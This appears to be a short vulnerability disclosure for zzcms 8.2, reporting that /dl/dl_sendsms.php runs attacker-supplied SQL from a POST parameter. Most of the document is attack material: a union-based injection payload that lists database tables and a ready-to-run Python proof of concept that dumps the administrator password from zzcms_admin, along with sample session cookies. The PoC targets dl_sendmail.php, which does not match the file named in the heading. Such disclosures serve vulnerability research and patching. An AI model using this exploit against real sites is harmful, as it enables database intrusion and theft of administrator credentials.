
# /dl/dl_sendsms.php

## Edition

zzcms 8.2

## Location

`/dl/dl_sendsms.php`

![][1]

### Code
$sql2=$sql." order by id asc limit $n,$size";

### Rows:73

### Harm

can get password through SQL injection

Cause the cause
Take a look at the logic of the bug,If the POST request is not empty, the $sql value will be equal to $_POST["sql"], $sql will be assigned to $sql2,
$sql2=$sql." order by id asc limit $n,$size";

$sql not added ' '
This will cause SQL inject

![][2]
![][3]

Construct payload verification

sql=select email from zzcms_dl where id=-1 union select group_concat(distinct table_name) from information_schema.columns where table_schema=database()#

![][4]
![][5]





## poc

```
import requests
import string


url = "http://192.168.199.23/dl/dl_sendmail.php"
cookies = {
'UserName':'1234','PassWord':'81dc9bdb52d04dc20036dbd8313ed055'}
flag = ''

data = {
     'sql':'select email from zzcms_dl where id=-1 union select pass from zzcms_admin #'
   }

r = requests.post(url,data,cookies=cookies)
r.encoding = 'utf-8'
print(r.text)


```
[6]

Get the administrator password






  [1]: ./images/1.png "1"
  [2]: ./images/2.png "2"
  [3]: ./images/3.png "3"
  [4]: ./images/4.png "4"
  [5]: ./images/5.png "5"
  [6]: ./images/6.png "6"

